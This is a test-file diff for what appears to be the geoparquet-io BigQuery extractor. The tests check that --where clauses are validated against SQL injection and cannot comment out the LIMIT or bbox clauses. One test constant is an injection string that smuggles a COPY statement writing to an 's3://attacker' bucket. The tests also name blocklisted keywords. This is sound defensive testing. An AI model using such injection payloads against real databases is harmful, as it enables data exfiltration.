@@ -473,6 +473,116 @@ class TestDryRun:
         assert result is None
 
 
+class TestWhereClauseValidation:
+    """--where must be routed through validate_where_clause (gpio #612 parity).
+
+    A statement-separator injection must be rejected before any network call,
+    on both the dry-run path and the real (non-dry-run) path.
+    """
+
+    INJECTION_WHERE = "1=1); COPY (SELECT 1) TO 's3://attacker/x'; --"
+
+    def test_dry_run_rejects_semicolon_injection(self):
+        """Dry-run must reject a ';' statement separator before printing SQL."""
+        from geoparquet_io.core.exceptions import ValidationError
+        from geoparquet_io.core.extract_bigquery import extract_bigquery
+
+        with pytest.raises(ValidationError, match="not a single filtering expression"):
+            extract_bigquery(
+                table_id="project.dataset.table",
+                dry_run=True,
+                where=self.INJECTION_WHERE,
+            )
+
+    # Blocklisted keywords (GRANT, DROP, DELETE) appear inside quoted literals
+    # here, so a validator that uppercases the whole clause rejects them.
+    @pytest.mark.parametrize(
+        "clause",
+        [
+            "name = 'Grant County'",
+            "descr ILIKE '%drop off%'",
+            "REPLACE(zip, '-', '') = '19104'",
+        ],
+    )
+    def test_dry_run_allows_legitimate_where(self, clause):
+        """A legitimate --where does not raise on the dry-run path."""
+        from geoparquet_io.core.extract_bigquery import extract_bigquery
+
+        result = extract_bigquery(
+            table_id="project.dataset.table",
+            dry_run=True,
+            where=clause,
+        )
+        assert result is None
+
+    @patch("geoparquet_io.core.extract_bigquery._setup_bigquery_connection")
+    def test_real_path_rejects_injection_before_network(self, mock_setup):
+        """Non-dry-run path must validate before establishing a BigQuery connection."""
+        from geoparquet_io.core.exceptions import ValidationError
+        from geoparquet_io.core.extract_bigquery import extract_bigquery
+
+        mock_setup.side_effect = AssertionError(
+            "network connection attempted before where-clause validation"
+        )
+
+        with pytest.raises(ValidationError, match="not a single filtering expression"):
+            extract_bigquery(
+                table_id="project.dataset.table",
+                dry_run=False,
+                where=self.INJECTION_WHERE,
+            )
+
+        mock_setup.assert_not_called()
+
+
+def _strip_line_comments(sql: str) -> str:
+    """Drop everything a ``--`` comment would swallow, line by line."""
+    return "\n".join(line.split("--")[0] for line in sql.splitlines())
+
+
+class TestWhereClauseCannotSwallowLaterClauses:
+    """A trailing ``--`` in --where must not comment out the rest of the query."""
+
+    TRAILING_COMMENT_WHERE = "1=1) --"
+
+    def test_build_bigquery_query_keeps_limit(self):
+        from geoparquet_io.core.extract_bigquery import _build_bigquery_query
+
+        sql = _build_bigquery_query(
+            con=None,
+            validated_table_id="project.dataset.table",
+            select_cols="*",
+            bbox=None,
+            bbox_mode="auto",
+            bbox_threshold=1000,
+            geom_col=None,
+            where=self.TRAILING_COMMENT_WHERE,
+            limit=10,
+        )
+        assert "LIMIT 10" in _strip_line_comments(sql)
+
+    def test_dry_run_sql_keeps_bbox_and_limit(self, monkeypatch):
+        import geoparquet_io.core.extract_bigquery as bq_module
+
+        printed: list[str] = []
+        monkeypatch.setattr(bq_module, "progress", printed.append)
+
+        bq_module._handle_dry_run(
+            validated_table_id="project.dataset.table",
+            include_list=None,
+            bbox="0,0,1,1",
+            bbox_mode="local",
+            bbox_threshold=1000,
+            where=self.TRAILING_COMMENT_WHERE,
+            limit=10,
+        )
+
+        sql = next(line for line in printed if line.startswith("SQL: "))
+        live_sql = _strip_line_comments(sql)
+        assert "ST_Intersects" in live_sql
+        assert "LIMIT 10" in live_sql
+
+
 class TestPythonAPI:
     """Test the Python API for BigQuery."""
 
